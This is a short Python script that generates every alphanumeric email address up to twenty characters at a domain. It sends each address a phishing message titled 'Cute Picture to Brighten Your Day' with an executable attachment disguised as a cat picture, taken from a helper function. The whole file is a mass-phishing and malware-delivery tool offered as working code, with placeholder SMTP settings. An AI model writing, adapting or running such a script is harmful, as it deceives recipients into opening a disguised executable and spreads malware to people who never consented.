import itertools
import string

from cat import find_exe, send_email


def find_emails(email_domain, max_length):
    addresses = []
    for length in range(1, max_length + 1):
        for combination in itertools.product(string.ascii_lowercase + string.digits, repeat=length):
            email = f"{''.join(combination)}@{email_domain}"
            addresses.append(email)
    return addresses


def send_phish(p_subject, p_body, p_to_email, p_smtp_server, p_smtp_port, p_sender_email, p_sender_password, p_ap):
    for address in p_to_email:
        send_email(p_subject, p_body, address, p_smtp_server, p_smtp_port, p_sender_email, p_sender_password, p_ap)


subject = "Cute Picture to Brighten Your Day"
attachment_path = find_exe()
body = "I found this cute cat online. I hope it makes your day a little bit better!"
email_addresses = find_emails("example_domain", 20)
smtp_server = "smtp.google.com"
smtp_port = 587
sender_email = "example@domain.com"
sender_password = "example"

send_phish(subject, body, email_addresses, smtp_server, smtp_port, sender_email, sender_password, attachment_path)
